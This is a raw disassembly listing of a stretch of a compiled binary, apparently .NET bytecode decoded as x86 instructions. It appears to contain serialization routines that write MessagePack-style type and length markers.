  4051bf:	00 40 55             	add    %al,0x55(%eax)
  4051c2:	00 00                	add    %al,(%eax)
  4051c4:	00 18                	add    %bl,(%eax)
  4051c6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051ca:	01 0b                	add    %ecx,(%ebx)
  4051cc:	03 07                	add    (%edi),%eax
  4051ce:	16                   	push   %ss
  4051cf:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051d2:	00 00                	add    %al,(%eax)
  4051d4:	0a 26                	or     (%esi),%ah
  4051d6:	07                   	pop    %es
  4051d7:	28 58 00             	sub    %bl,0x0(%eax)
  4051da:	00 06                	add    %al,(%esi)
  4051dc:	0b 07                	or     (%edi),%eax
  4051de:	16                   	push   %ss
  4051df:	28 07                	sub    %al,(%edi)
  4051e1:	01 00                	add    %eax,(%eax)
  4051e3:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051e6:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051e9:	00 06                	add    %al,(%esi)
  4051eb:	02 18                	add    (%eax),%bl
  4051ed:	7d 36                	jge    0x405225
  4051ef:	00 00                	add    %al,(%eax)
  4051f1:	04 16                	add    $0x16,%al
  4051f3:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051f8:	00 02                	add    %al,(%edx)
  4051fa:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051fe:	06                   	push   %es
  4051ff:	25 03 28 96 00       	and    $0x962803,%eax
  405204:	00 06                	add    %al,(%esi)
  405206:	6f                   	outsl  %ds:(%esi),(%dx)
  405207:	6a 00                	push   $0x0
  405209:	00 06                	add    %al,(%esi)
  40520b:	03 6f 88             	add    -0x78(%edi),%ebp
  40520e:	00 00                	add    %al,(%eax)
  405210:	06                   	push   %es
  405211:	09 17                	or     %edx,(%edi)
  405213:	58                   	pop    %eax
  405214:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405219:	2a 06                	sub    (%esi),%al
  40521b:	20 df                	and    %bl,%bh
  40521d:	00 00                	add    %al,(%eax)
  40521f:	00 40 55             	add    %al,0x55(%eax)
  405222:	00 00                	add    %al,(%eax)
  405224:	00 1a                	add    %bl,(%edx)
  405226:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40522a:	01 0b                	add    %ecx,(%ebx)
  40522c:	03 07                	add    (%edi),%eax
  40522e:	16                   	push   %ss
  40522f:	1a 6f 45             	sbb    0x45(%edi),%ch
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 26                	or     (%esi),%ah
  405236:	07                   	pop    %es
  405237:	28 58 00             	sub    %bl,0x0(%eax)
  40523a:	00 06                	add    %al,(%esi)
  40523c:	0b 07                	or     (%edi),%eax
  40523e:	16                   	push   %ss
  40523f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405243:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405246:	28 6b 00             	sub    %ch,0x0(%ebx)
  405249:	00 06                	add    %al,(%esi)
  40524b:	02 18                	add    (%eax),%bl
  40524d:	7d 36                	jge    0x405285
  40524f:	00 00                	add    %al,(%eax)
  405251:	04 16                	add    $0x16,%al
  405253:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405258:	00 02                	add    %al,(%edx)
  40525a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40525e:	06                   	push   %es
  40525f:	25 03 28 96 00       	and    $0x962803,%eax
  405264:	00 06                	add    %al,(%esi)
  405266:	6f                   	outsl  %ds:(%esi),(%dx)
  405267:	6a 00                	push   $0x0
  405269:	00 06                	add    %al,(%esi)
  40526b:	03 6f 88             	add    -0x78(%edi),%ebp
  40526e:	00 00                	add    %al,(%eax)
  405270:	06                   	push   %es
  405271:	09 17                	or     %edx,(%edi)
  405273:	58                   	pop    %eax
  405274:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405279:	2a 06                	sub    (%esi),%al
  40527b:	20 da                	and    %bl,%dl
  40527d:	00 00                	add    %al,(%eax)
  40527f:	00 40 0e             	add    %al,0xe(%eax)
  405282:	00 00                	add    %al,(%eax)
  405284:	00 02                	add    %al,(%edx)
  405286:	06                   	push   %es
  405287:	03 28                	add    (%eax),%ebp
  405289:	97                   	xchg   %eax,%edi
  40528a:	00 00                	add    %al,(%eax)
  40528c:	06                   	push   %es
  40528d:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405293:	06                   	push   %es
  405294:	20 db                	and    %bl,%bl
  405296:	00 00                	add    %al,(%eax)
  405298:	00 40 0e             	add    %al,0xe(%eax)
  40529b:	00 00                	add    %al,(%eax)
  40529d:	00 02                	add    %al,(%edx)
  40529f:	06                   	push   %es
  4052a0:	03 28                	add    (%eax),%ebp
  4052a2:	97                   	xchg   %eax,%edi
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	06                   	push   %es
  4052a6:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052ac:	06                   	push   %es
  4052ad:	20 d0                	and    %dl,%al
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	00 40 0f             	add    %al,0xf(%eax)
  4052b4:	00 00                	add    %al,(%eax)
  4052b6:	00 02                	add    %al,(%edx)
  4052b8:	03 6f 00             	add    0x0(%edi),%ebp
  4052bb:	01 00                	add    %eax,(%eax)
  4052bd:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c0:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052c4:	06                   	push   %es
  4052c5:	2a 06                	sub    (%esi),%al
  4052c7:	20 d1                	and    %dl,%cl
  4052c9:	00 00                	add    %al,(%eax)
  4052cb:	00 40 27             	add    %al,0x27(%eax)
  4052ce:	00 00                	add    %al,(%eax)
  4052d0:	00 18                	add    %bl,(%eax)
  4052d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052d6:	01 0b                	add    %ecx,(%ebx)
  4052d8:	03 07                	add    (%edi),%eax
  4052da:	16                   	push   %ss
  4052db:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	0a 26                	or     (%esi),%ah
  4052e2:	07                   	pop    %es
  4052e3:	28 58 00             	sub    %bl,0x0(%eax)
  4052e6:	00 06                	add    %al,(%esi)
  4052e8:	0b 02                	or     (%edx),%eax
  4052ea:	07                   	pop    %es
  4052eb:	16                   	push   %ss
  4052ec:	28 07                	sub    %al,(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 6a 28             	or     0x28(%edx),%ch
  4052f3:	74 00                	je     0x4052f5
  4052f5:	00 06                	add    %al,(%esi)
  4052f7:	2a 06                	sub    (%esi),%al
  4052f9:	20 d2                	and    %dl,%dl
  4052fb:	00 00                	add    %al,(%eax)
  4052fd:	00 40 27             	add    %al,0x27(%eax)
  405300:	00 00                	add    %al,(%eax)
  405302:	00 1a                	add    %bl,(%edx)
  405304:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405308:	01 0b                	add    %ecx,(%ebx)
  40530a:	03 07                	add    (%edi),%eax
  40530c:	16                   	push   %ss
  40530d:	1a 6f 45             	sbb    0x45(%edi),%ch
  405310:	00 00                	add    %al,(%eax)
  405312:	0a 26                	or     (%esi),%ah
  405314:	07                   	pop    %es
  405315:	28 58 00             	sub    %bl,0x0(%eax)
  405318:	00 06                	add    %al,(%esi)
  40531a:	0b 02                	or     (%edx),%eax
  40531c:	07                   	pop    %es
  40531d:	16                   	push   %ss
  40531e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405322:	0a 6a 28             	or     0x28(%edx),%ch
  405325:	74 00                	je     0x405327
  405327:	00 06                	add    %al,(%esi)
  405329:	2a 06                	sub    (%esi),%al
  40532b:	20 d3                	and    %dl,%bl
  40532d:	00 00                	add    %al,(%eax)
  40532f:	00 40 25             	add    %al,0x25(%eax)
  405332:	00 00                	add    %al,(%eax)
  405334:	00 1e                	add    %bl,(%esi)
  405336:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40533a:	01 0b                	add    %ecx,(%ebx)
  40533c:	03 07                	add    (%edi),%eax
  40533e:	16                   	push   %ss
  40533f:	1e                   	push   %ds
  405340:	6f                   	outsl  %ds:(%esi),(%dx)
  405341:	45                   	inc    %ebp
  405342:	00 00                	add    %al,(%eax)
  405344:	0a 26                	or     (%esi),%ah
  405346:	07                   	pop    %es
  405347:	28 58 00             	sub    %bl,0x0(%eax)
  40534a:	00 06                	add    %al,(%esi)
  40534c:	0b 02                	or     (%edx),%eax
  40534e:	07                   	pop    %es
  40534f:	16                   	push   %ss
  405350:	28 08                	sub    %cl,(%eax)
  405352:	01 00                	add    %eax,(%eax)
  405354:	0a 28                	or     (%eax),%ch
  405356:	74 00                	je     0x405358
  405358:	00 06                	add    %al,(%esi)
  40535a:	2a 00                	sub    (%eax),%al
  40535c:	1b 30                	sbb    (%eax),%esi
  40535e:	04 00                	add    $0x0,%al
  405360:	4d                   	dec    %ebp
  405361:	00 00                	add    %al,(%eax)
  405363:	00 27                	add    %ah,(%edi)
  405365:	00 00                	add    %al,(%eax)
  405367:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40536a:	00 00                	add    %al,(%eax)
  40536c:	0a 0a                	or     (%edx),%cl
  40536e:	02 06                	add    (%esi),%al
  405370:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  405376:	6f                   	outsl  %ds:(%esi),(%dx)
  405377:	e2 00                	loop   0x405379
  405379:	00 0a                	add    %cl,(%edx)
  40537b:	d4 8d                	aam    $0x8d
  40537d:	44                   	inc    %esp
  40537e:	00 00                	add    %al,(%eax)
  405380:	01 0b                	add    %ecx,(%ebx)
  405382:	06                   	push   %es
  405383:	16                   	push   %ss
  405384:	6a 6f                	push   $0x6f
  405386:	4e                   	dec    %esi
  405387:	00 00                	add    %al,(%eax)
  405389:	0a 06                	or     (%esi),%al
  40538b:	07                   	pop    %es
  40538c:	16                   	push   %ss
  40538d:	06                   	push   %es
  40538e:	6f                   	outsl  %ds:(%esi),(%dx)
  40538f:	e2 00                	loop   0x405391
  405391:	00 0a                	add    %cl,(%edx)
  405393:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40539a:	07                   	pop    %es
  40539b:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a1:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053a7:	39 06                	cmp    %eax,(%esi)
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	00 06                	add    %al,(%esi)
  4053ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4053ae:	33 00                	xor    (%eax),%eax
  4053b0:	00 0a                	add    %cl,(%edx)
  4053b2:	dc 08                	fmull  (%eax)
  4053b4:	2a 00                	sub    (%eax),%al
  4053b6:	00 00                	add    %al,(%eax)
  4053b8:	01 10                	add    %edx,(%eax)
  4053ba:	00 00                	add    %al,(%eax)
  4053bc:	02 00                	add    (%eax),%al
  4053be:	06                   	push   %es
  4053bf:	00 38                	add    %bh,(%eax)
  4053c1:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053c8:	13 30                	adc    (%eax),%esi
  4053ca:	02 00                	add    (%eax),%al
  4053cc:	ec                   	in     (%dx),%al
  4053cd:	00 00                	add    %al,(%eax)
  4053cf:	00 20                	add    %ah,(%eax)
  4053d1:	00 00                	add    %al,(%eax)
  4053d3:	11 02                	adc    %eax,(%edx)
  4053d5:	7b 36                	jnp    0x40540d
  4053d7:	00 00                	add    %al,(%eax)
  4053d9:	04 0a                	add    $0xa,%al
  4053db:	06                   	push   %es
  4053dc:	45                   	inc    %ebp
  4053dd:	0c 00                	or     $0x0,%al
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	05 00 00 00 05       	add    $0x5000000,%eax
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053f3:	00 00                	add    %al,(%eax)
  4053f5:	1e                   	push   %ds
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 30                	add    %dh,(%eax)
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	00 42 00             	add    %al,0x0(%edx)
  4053ff:	00 00                	add    %al,(%eax)
  405401:	54                   	push   %esp
  405402:	00 00                	add    %al,(%eax)
  405404:	00 66 00             	add    %ah,0x0(%esi)
  405407:	00 00                	add    %al,(%eax)
  405409:	79 00                	jns    0x40540b
  40540b:	00 00                	add    %al,(%eax)
  40540d:	86 00                	xchg   %al,(%eax)
  40540f:	00 00                	add    %al,(%eax)
  405411:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  405417:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  40541d:	03 02                	add    (%edx),%eax
  40541f:	7b 35                	jnp    0x405456
  405421:	00 00                	add    %al,(%eax)
  405423:	04 74                	add    $0x74,%al
  405425:	38 00                	cmp    %al,(%eax)
  405427:	00 01                	add    %al,(%ecx)
  405429:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  40542f:	03 02                	add    (%edx),%eax
  405431:	7b 35                	jnp    0x405468
  405433:	00 00                	add    %al,(%eax)
  405435:	04 a5                	add    $0xa5,%al
  405437:	68 00 00 01 28       	push   $0x28010000
  40543c:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405441:	03 02                	add    (%edx),%eax
  405443:	7b 35                	jnp    0x40547a
  405445:	00 00                	add    %al,(%eax)
  405447:	04 a5                	add    $0xa5,%al
  405449:	95                   	xchg   %eax,%ebp
  40544a:	00 00                	add    %al,(%eax)
  40544c:	01 28                	add    %ebp,(%eax)
  40544e:	9f                   	lahf
  40544f:	00 00                	add    %al,(%eax)
  405451:	06                   	push   %es
  405452:	2a 03                	sub    (%ebx),%al
  405454:	02 7b 35             	add    0x35(%ebx),%bh
  405457:	00 00                	add    %al,(%eax)
  405459:	04 a5                	add    $0xa5,%al
  40545b:	6c                   	insb   (%dx),%es:(%edi)
  40545c:	00 00                	add    %al,(%eax)
  40545e:	01 28                	add    %ebp,(%eax)
  405460:	9e                   	sahf
  405461:	00 00                	add    %al,(%eax)
  405463:	06                   	push   %es
  405464:	2a 03                	sub    (%ebx),%al
  405466:	02 7b 35             	add    0x35(%ebx),%bh
  405469:	00 00                	add    %al,(%eax)
  40546b:	04 a5                	add    $0xa5,%al
  40546d:	96                   	xchg   %eax,%esi
  40546e:	00 00                	add    %al,(%eax)
  405470:	01 28                	add    %ebp,(%eax)
  405472:	9c                   	pushf
  405473:	00 00                	add    %al,(%eax)
  405475:	06                   	push   %es
  405476:	2a 03                	sub    (%ebx),%al
  405478:	02 7b 35             	add    0x35(%ebx),%bh
  40547b:	00 00                	add    %al,(%eax)
  40547d:	04 a5                	add    $0xa5,%al
  40547f:	97                   	xchg   %eax,%edi
  405480:	00 00                	add    %al,(%eax)
  405482:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  405486:	00 00                	add    %al,(%eax)
  405488:	06                   	push   %es
  405489:	2a 03                	sub    (%ebx),%al
  40548b:	02 28                	add    (%eax),%ch
  40548d:	77 00                	ja     0x40548f
  40548f:	00 06                	add    %al,(%esi)
  405491:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  405497:	03 02                	add    (%edx),%eax
  405499:	7b 35                	jnp    0x4054d0
  40549b:	00 00                	add    %al,(%eax)
  40549d:	04 74                	add    $0x74,%al
  40549f:	02 00                	add    (%eax),%al
  4054a1:	00 1b                	add    %bl,(%ebx)
  4054a3:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054a9:	02 03                	add    (%ebx),%al
  4054ab:	28 72 00             	sub    %dh,0x0(%edx)
  4054ae:	00 06                	add    %al,(%esi)
  4054b0:	2a 02                	sub    (%edx),%al
  4054b2:	03 28                	add    (%eax),%ebp
  4054b4:	73 00                	jae    0x4054b6
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 03                	sub    (%ebx),%al
  4054ba:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c0:	1b 30                	sbb    (%eax),%esi
  4054c2:	03 00                	add    (%eax),%eax
  4054c4:	42                   	inc    %edx
  4054c5:	00 00                	add    %al,(%eax)
  4054c7:	00 28                	add    %ch,(%eax)
  4054c9:	00 00                	add    %al,(%eax)
  4054cb:	11 02                	adc    %eax,(%edx)
  4054cd:	0a 16                	or     (%esi),%dl
  4054cf:	0b 06                	or     (%esi),%eax
  4054d1:	12 01                	adc    (%ecx),%al
  4054d3:	28 49 00             	sub    %cl,0x0(%ecx)
  4054d6:	00 0a                	add    %cl,(%edx)
  4054d8:	02 7b 39             	add    0x39(%ebx),%bh
  4054db:	00 00                	add    %al,(%eax)
  4054dd:	04 3a                	add    $0x3a,%al
  4054df:	12 00                	adc    (%eax),%al
  4054e1:	00 00                	add    %al,(%eax)
  4054e3:	02 02                	add    (%edx),%al
  4054e5:	02 7b 38             	add    0x38(%ebx),%bh
  4054e8:	00 00                	add    %al,(%eax)
  4054ea:	04 73                	add    $0x73,%al
  4054ec:	63 00                	arpl   %eax,(%eax)
  4054ee:	00 06                	add    %al,(%esi)
  4054f0:	7d 39                	jge    0x40552b
  4054f2:	00 00                	add    %al,(%eax)
  4054f4:	04 dd                	add    $0xdd,%al
  4054f6:	0d 00 00 00 07       	or     $0x7000000,%eax
  4054fb:	39 06                	cmp    %eax,(%esi)
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 06                	add    %al,(%esi)
  405501:	28 50 00             	sub    %dl,0x0(%eax)
  405504:	00 0a                	add    %cl,(%edx)
  405506:	dc 02                	faddl  (%edx)
  405508:	7b 39                	jnp    0x405543
  40550a:	00 00                	add    %al,(%eax)
  40550c:	04 2a                	add    $0x2a,%al
  40550e:	00 00                	add    %al,(%eax)
  405510:	01 10                	add    %edx,(%eax)
  405512:	00 00                	add    %al,(%eax)
  405514:	02 00                	add    (%eax),%al
  405516:	04 00                	add    $0x0,%al
  405518:	2a 2e                	sub    (%esi),%ch
  40551a:	00 0d 00 00 00 00    	add    %cl,0x0
  405520:	13 30                	adc    (%eax),%esi
  405522:	04 00                	add    $0x0,%al
  405524:	18 00                	sbb    %al,(%eax)
  405526:	00 00                	add    %al,(%eax)
  405528:	29 00                	sub    %eax,(%eax)
  40552a:	00 11                	add    %dl,(%ecx)
  40552c:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  405532:	0a 02                	or     (%edx),%al
  405534:	06                   	push   %es
  405535:	16                   	push   %ss
  405536:	03 6f 45             	add    0x45(%edi),%ebp
  405539:	00 00                	add    %al,(%eax)
  40553b:	0a 26                	or     (%esi),%ah
  40553d:	06                   	push   %es
  40553e:	28 55 00             	sub    %dl,0x0(%ebp)
  405541:	00 06                	add    %al,(%esi)
  405543:	2a 13                	sub    (%ebx),%dl
  405545:	30 04 00             	xor    %al,(%eax,%eax,1)
  405548:	b1 00                	mov    $0x0,%cl
  40554a:	00 00                	add    %al,(%eax)
  40554c:	2a 00                	sub    (%eax),%al
  40554e:	00 11                	add    %dl,(%ecx)
  405550:	14 0a                	adc    $0xa,%al
  405552:	16                   	push   %ss
  405553:	0b 02                	or     (%edx),%eax
  405555:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  40555b:	18 00                	sbb    %al,(%eax)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	02 20                	add    (%eax),%ah
  405561:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  405566:	0d 00 00 00 02       	or     $0x2000000,%eax
  40556b:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405571:	0b 38                	or     (%eax),%edi
  405573:	72 00                	jb     0x405575
  405575:	00 00                	add    %al,(%eax)
  405577:	02 20                	add    (%eax),%ah
  405579:	d9 00                	flds   (%eax)
  40557b:	00 00                	add    %al,(%eax)
  40557d:	40                   	inc    %eax
  40557e:	0c 00                	or     $0x0,%al
  405580:	00 00                	add    %al,(%eax)
  405582:	03 6f 00             	add    0x0(%edi),%ebp
  405585:	01 00                	add    %eax,(%eax)
  405587:	0a 0b                	or     (%ebx),%cl
  405589:	38 5b 00             	cmp    %bl,0x0(%ebx)
  40558c:	00 00                	add    %al,(%eax)
  40558e:	02 20                	add    (%eax),%ah
  405590:	da 00                	fiaddl (%eax)
  405592:	00 00                	add    %al,(%eax)
  405594:	40                   	inc    %eax
  405595:	25 00 00 00 18       	and    $0x18000000,%eax
  40559a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40559e:	01 0a                	add    %ecx,(%edx)
  4055a0:	03 06                	add    (%esi),%eax
  4055a2:	16                   	push   %ss
  4055a3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055a6:	00 00                	add    %al,(%eax)
  4055a8:	0a 26                	or     (%esi),%ah
  4055aa:	06                   	push   %es
  4055ab:	28 58 00             	sub    %bl,0x0(%eax)
  4055ae:	00 06                	add    %al,(%esi)
  4055b0:	0a 06                	or     (%esi),%al
  4055b2:	16                   	push   %ss
  4055b3:	28 02                	sub    %al,(%edx)
  4055b5:	01 00                	add    %eax,(%eax)
  4055b7:	0a 0b                	or     (%ebx),%cl
  4055b9:	38 2b                	cmp    %ch,(%ebx)
  4055bb:	00 00                	add    %al,(%eax)
  4055bd:	00 02                	add    %al,(%edx)
  4055bf:	20 db                	and    %bl,%bl
  4055c1:	00 00                	add    %al,(%eax)
  4055c3:	00 40 20             	add    %al,0x20(%eax)
  4055c6:	00 00                	add    %al,(%eax)
  4055c8:	00 1a                	add    %bl,(%edx)
  4055ca:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ce:	01 0a                	add    %ecx,(%edx)
  4055d0:	03 06                	add    (%esi),%eax
  4055d2:	16                   	push   %ss
  4055d3:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055d6:	00 00                	add    %al,(%eax)
  4055d8:	0a 26                	or     (%esi),%ah
  4055da:	06                   	push   %es
  4055db:	28 58 00             	sub    %bl,0x0(%eax)
  4055de:	00 06                	add    %al,(%esi)
  4055e0:	0a 06                	or     (%esi),%al
  4055e2:	16                   	push   %ss
  4055e3:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055e7:	0a 0b                	or     (%ebx),%cl
  4055e9:	07                   	pop    %es
  4055ea:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ee:	01 0a                	add    %ecx,(%edx)
  4055f0:	03 06                	add    (%esi),%eax
  4055f2:	16                   	push   %ss
  4055f3:	07                   	pop    %es
  4055f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4055f5:	45                   	inc    %ebp
  4055f6:	00 00                	add    %al,(%eax)
  4055f8:	0a 26                	or     (%esi),%ah
  4055fa:	06                   	push   %es
  4055fb:	28 55 00             	sub    %dl,0x0(%ebp)
  4055fe:	00 06                	add    %al,(%esi)
  405600:	2a 00                	sub    (%eax),%al
  405602:	00 00                	add    %al,(%eax)
  405604:	13 30                	adc    (%eax),%esi
  405606:	04 00                	add    $0x0,%al
  405608:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  40560d:	00 00                	add    %al,(%eax)
  40560f:	11 03                	adc    %eax,(%ebx)
  405611:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  405615:	06                   	push   %es
  405616:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405619:	06                   	push   %es
  40561a:	8e 69 0c             	mov    0xc(%ecx),%gs
  40561d:	16                   	push   %ss
  40561e:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  405623:	16                   	push   %ss
  405624:	00 00                	add    %al,(%eax)
  405626:	00 20                	add    %ah,(%eax)
  405628:	a0 00 00 00 08       	mov    0x8000000,%al
  40562d:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405630:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  405635:	00 00                	add    %al,(%eax)
  405637:	0a 38                	or     (%eax),%bh
  405639:	80 00 00             	addb   $0x0,(%eax)
  40563c:	00 08                	add    %cl,(%eax)
  40563e:	20 ff                	and    %bh,%bh
  405640:	00 00                	add    %al,(%eax)
  405642:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405648:	20 d9                	and    %bl,%cl
  40564a:	00 00                	add    %al,(%eax)
  40564c:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405652:	00 00                	add    %al,(%eax)
  405654:	0a 08                	or     (%eax),%cl
  405656:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  40565c:	00 00                	add    %al,(%eax)
  40565e:	0a 38                	or     (%eax),%bh
  405660:	59                   	pop    %ecx
  405661:	00 00                	add    %al,(%eax)
  405663:	00 08                	add    %cl,(%eax)
  405665:	20 ff                	and    %bh,%bh
  405667:	ff 00                	incl   (%eax)
  405669:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40566f:	20 da                	and    %bl,%dl
  405671:	00 00                	add    %al,(%eax)
  405673:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405679:	00 00                	add    %al,(%eax)
  40567b:	0a 08                	or     (%eax),%cl
  40567d:	68 28 ef 00 00       	push   $0xef28
  405682:	0a 28                	or     (%eax),%ch
  405684:	58                   	pop    %eax
  405685:	00 00                	add    %al,(%eax)
  405687:	06                   	push   %es
  405688:	0b 02                	or     (%edx),%eax
  40568a:	07                   	pop    %es
  40568b:	16                   	push   %ss
  40568c:	07                   	pop    %es
  40568d:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405690:	4c                   	dec    %esp
  405691:	00 00                	add    %al,(%eax)
  405693:	0a 38                	or     (%eax),%bh
  405695:	24 00                	and    $0x0,%al
  405697:	00 00                	add    %al,(%eax)
  405699:	20 db                	and    %bl,%bl
  40569b:	00 00                	add    %al,(%eax)
  40569d:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	0a 08                	or     (%eax),%cl
  4056a7:	28 4a 00             	sub    %cl,0x0(%edx)
  4056aa:	00 0a                	add    %cl,(%edx)
  4056ac:	28 58 00             	sub    %bl,0x0(%eax)
  4056af:	00 06                	add    %al,(%esi)
  4056b1:	0b 02                	or     (%edx),%eax
  4056b3:	07                   	pop    %es
  4056b4:	16                   	push   %ss
  4056b5:	07                   	pop    %es
  4056b6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056b9:	4c                   	dec    %esp
  4056ba:	00 00                	add    %al,(%eax)
  4056bc:	0a 02                	or     (%edx),%al
  4056be:	06                   	push   %es
  4056bf:	16                   	push   %ss
  4056c0:	06                   	push   %es
  4056c1:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c4:	4c                   	dec    %esp
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 2a                	or     (%edx),%ch
  4056c9:	00 00                	add    %al,(%eax)
  4056cb:	00 13                	add    %dl,(%ebx)
  4056cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d0:	94                   	xchg   %eax,%esp
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056d6:	00 11                	add    %dl,(%ecx)
  4056d8:	14 0a                	adc    $0xa,%al
  4056da:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e0:	07                   	pop    %es
  4056e1:	20 ff                	and    %bh,%bh
  4056e3:	00 00                	add    %al,(%eax)
  4056e5:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056eb:	20 c4                	and    %al,%ah
  4056ed:	00 00                	add    %al,(%eax)
  4056ef:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056f2:	08 6f ee             	or     %ch,-0x12(%edi)
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	0a 07                	or     (%edi),%al
  4056f9:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  4056fc:	08 6f ee             	or     %ch,-0x12(%edi)
  4056ff:	00 00                	add    %al,(%eax)
  405701:	0a 38                	or     (%eax),%bh
  405703:	59                   	pop    %ecx
  405704:	00 00                	add    %al,(%eax)
  405706:	00 07                	add    %al,(%edi)
  405708:	20 ff                	and    %bh,%bh
  40570a:	ff 00                	incl   (%eax)
  40570c:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405712:	20 c5                	and    %al,%ch
  405714:	00 00                	add    %al,(%eax)
  405716:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405719:	08 6f ee             	or     %ch,-0x12(%edi)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	0a 07                	or     (%edi),%al
  405720:	68 28 ef 00 00       	push   $0xef28
  405725:	0a 28                	or     (%eax),%ch
  405727:	58                   	pop    %eax
  405728:	00 00                	add    %al,(%eax)
  40572a:	06                   	push   %es
  40572b:	0a 02                	or     (%edx),%al
  40572d:	06                   	push   %es
  40572e:	16                   	push   %ss
  40572f:	06                   	push   %es
  405730:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405733:	4c                   	dec    %esp
  405734:	00 00                	add    %al,(%eax)
  405736:	0a 38                	or     (%eax),%bh
  405738:	24 00                	and    $0x0,%al
  40573a:	00 00                	add    %al,(%eax)
  40573c:	20 c6                	and    %al,%dh
  40573e:	00 00                	add    %al,(%eax)
  405740:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
